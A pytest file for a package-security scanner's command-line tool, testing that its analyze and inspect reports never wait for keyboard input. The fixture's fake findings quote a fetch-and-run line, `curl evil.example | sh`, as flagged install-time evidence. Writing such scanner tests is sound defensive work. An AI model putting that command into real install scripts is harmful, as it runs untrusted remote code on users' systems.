"""`analyze` and `inspect` are non-interactive.

A security tool that stops and waits for a keypress is broken in two ways at once: it
hangs in CI, and it makes the same command behave differently depending on whether a human
happened to be at the terminal. The run that reviewed the most evidence would be the run
that hung. These tests pin that property down for the analysis commands.

`install` is deliberately excluded - it prompts because it is about to modify an
environment and is asking permission to do so.
"""

from __future__ import annotations

from datetime import UTC, datetime

import pytest
from packsafe_cli.display.inspect import render_inspection
from packsafe_cli.display.report import render_report
from packsafe_core.models.package import EcosystemType, PackageRequest
from packsafe_core.models.result import AnalysisOutcome
from packsafe_core.models.scoring import (
    Decision,
    Finding,
    GateResult,
    GateSeverity,
    RiskLevel,
    ScoreAttribution,
    ScoreResult,
)
from packsafe_core.pipeline.context import AnalysisContext
from rich.console import Console


def _outcome() -> AnalysisOutcome:
    """A package with enough findings and triggered gates to exercise the collapsed path."""
    score = ScoreResult(
        package_name="suspicious-pkg",
        ecosystem="pypi",
        version="1.0.0",
        final_score=12.0,
        base_score=40.0,
        risk_level=RiskLevel.CRITICAL,
        decision=Decision.BLOCK,
        confidence=88.0,
        categories={},
        findings=tuple(
            Finding(
                finding_id=f"F-{i}",
                category="integrity",
                severity="CRITICAL",
                confidence=0.9,
                title=f"Remote code execution during install ({i})",
                description="Archive code downloads and runs a remote payload.",
                evidence=f"setup.py:{i} - os.system('curl evil.example | sh')",
                source="static_analysis",
            )
            for i in range(15)
        ),
        gates=(
            GateResult(
                gate_id="GATE-REMOTE-EXEC",
                triggered=True,
                severity=GateSeverity.CRITICAL,
                reason="Remote code execution detected.",
                decision_override=Decision.BLOCK,
                score_floor=5.0,
                evidence_ids=("setup.py:1 - os.system(...)",),
            ),
        ),
        attribution=ScoreAttribution(
            category_contributions={},
            metric_attributions=(),
            top_positive_signals=(),
            top_negative_signals=(),
            primary_recommendation="",
        ),
        analyzed_at=datetime(2026, 1, 1, tzinfo=UTC),
        engine_version="1.0.0",
        config_version="2026-09-v1.2",
        config_sha256="abc123",
    )
    return AnalysisOutcome(
        score=score,
        context=AnalysisContext(
            request=PackageRequest(name="suspicious-pkg", ecosystem=EcosystemType.pypi)
        ),
    )


@pytest.fixture
def console() -> Console:
    # A terminal that looks interactive, so a regression to prompting would actually show
    # up rather than being silently skipped by the non-interactive path.
    return Console(width=100, force_terminal=True, no_color=True, record=True)


#: Rich renders its Confirm prompt with a "(y/n)" suffix. Matching that rather than a bare
#: "?" matters: "?" is also the UNKNOWN icon every check block uses for evidence that was
#: never collected, so searching for it alone would fail on perfectly correct output.
PROMPT_SUFFIX = "(y/n)"


class TestAnalyze:
    def test_it_never_asks_anything(self, console):
        """The whole point: no prompt, no matter how much detail was withheld."""
        render_report(console, _outcome())

        output = console.export_text()
        assert PROMPT_SUFFIX not in output
        assert "Show " not in output

    def test_it_does_not_wait_for_a_keypress(self, console, monkeypatch):
        """A prompt would call into rich's Confirm, which reads stdin."""
        calls: list = []

        class Tripwire:
            def __getattr__(self, name):
                calls.append(name)
                raise AssertionError(f"render_report touched the console's {name}")

        monkeypatch.setattr(console, "input", Tripwire(), raising=False)

        render_report(console, _outcome())

        assert calls == []

    def test_collapsed_is_the_default_and_still_bounded(self, console):
        render_report(console, _outcome())

        output = console.export_text()
        # Bounded: not all fifteen findings are listed.
        assert output.count("Remote code execution during install") < 15
        # And it says how to see the rest.
        assert "--all" in output

    def test_all_expands_the_sections_the_default_collapses(self, console):
        """`--all` removes the *collapse*, which is not the same as removing the bound.

        ``MAX_RISK_FACTORS`` caps even the expanded view, because on a heavily flagged
        package the tail is long and the log has it. What changes is that the list is
        enumerated instead of summarized, and the gate reason is spelled out.
        """
        collapsed = Console(width=100, force_terminal=True, no_color=True, record=True)
        expanded = Console(width=100, force_terminal=True, no_color=True, record=True)

        render_report(collapsed, _outcome())
        render_report(expanded, _outcome(), expand=True)

        short = collapsed.export_text()
        long = expanded.export_text()

        # Default names the worst finding only; --all enumerates them.
        assert short.count("Remote code execution during install") == 1
        assert long.count("Remote code execution during install") > 1
        # The gate reason is spelled out rather than withheld.
        assert "Detail withheld" in short
        assert "Detail withheld" not in long

    def test_expanded_still_bounds_an_oversized_finding_list(self, console):
        """Honest about the limit rather than pretending `--all` means unlimited."""
        render_report(console, _outcome(), expand=True)

        output = console.export_text()
        assert "not shown" in output

    def test_the_two_modes_differ_only_in_detail(self, console):
        collapsed = Console(width=100, force_terminal=True, no_color=True, record=True)
        expanded = Console(width=100, force_terminal=True, no_color=True, record=True)

        render_report(collapsed, _outcome())
        render_report(expanded, _outcome(), expand=True)

        # The verdict itself is identical; only the withheld sections grow.
        for console_out in (collapsed, expanded):
            text = console_out.export_text()
            assert "12/100" in text
            assert "DO NOT INSTALL" in text


class TestInspect:
    def test_it_never_asks_anything(self, console):
        render_inspection(console, _outcome())

        output = console.export_text()
        assert PROMPT_SUFFIX not in output
        assert "Show " not in output

    def test_all_still_expands_it(self, console):
        render_inspection(console, _outcome(), expand=True)

        assert console.export_text()